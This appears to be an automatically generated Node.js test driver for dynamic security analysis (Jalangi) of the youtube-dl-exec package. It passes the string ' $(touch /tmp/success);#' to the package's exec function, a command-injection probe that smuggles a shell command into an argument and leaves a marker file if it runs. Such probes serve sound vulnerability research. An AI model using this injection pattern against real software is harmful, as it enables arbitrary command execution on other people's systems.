// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/youtube-dl-exec/node_modules/youtube-dl-exec');
try {
	var x0 = [" $(touch /tmp/success);#"];
PUT["exec"](x0)();
} catch (e) {
	console.log(e);
}